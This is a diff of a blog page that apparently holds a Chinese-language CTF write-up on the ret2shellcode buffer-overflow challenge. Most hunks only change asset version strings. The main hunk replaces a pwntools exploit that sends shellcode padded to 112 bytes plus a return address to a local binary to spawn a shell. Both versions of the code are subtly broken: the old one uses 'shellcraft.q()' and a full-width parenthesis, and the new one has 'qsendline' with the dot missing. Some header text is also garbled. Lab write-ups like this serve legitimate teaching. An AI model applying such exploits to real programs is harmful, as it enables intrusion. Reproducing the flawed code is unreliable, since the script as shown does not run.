@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1626266329555">
+<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1626266578361">
 <link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">
 
 
@@ -35,7 +35,7 @@ ret2shellco..." />
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://cc-nianchu.github.io">
-        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1626266329555" class="site-logo">
+        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1626266578361" class="site-logo">
         <h1 class="site-title">nianchu</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -139,11 +139,13 @@ cyclic pattern是一个很好用的功能，pattern就是指一个字符串。�
 因此我们可以构造payload<br>
 payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
 EXP如下</p>
-<pre><code>from pwn import*
-q=process('./ret2shellcode')
-shellcode =asm(shellcraft.q())
-payload=shellcode.ljust(112,'a')+p32（0x0804A080)
-q.sendline(payload)
+<pre><code>from pwn import *
+
+q = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 q.interactive()
 </code></pre>
 
